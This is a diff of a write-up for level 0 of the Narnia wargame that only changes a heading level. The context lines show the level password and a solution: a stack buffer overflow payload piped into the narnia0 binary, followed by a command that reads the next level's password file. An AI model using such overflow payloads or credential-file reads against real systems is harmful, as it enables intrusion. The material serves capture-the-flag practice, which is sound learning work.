@@ -6,7 +6,7 @@
 
 **Password**: *narnia0*
 
-### Solution
+#### Solution
 ```bash
 (python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
 cat /etc/narnia_pass/narnia1
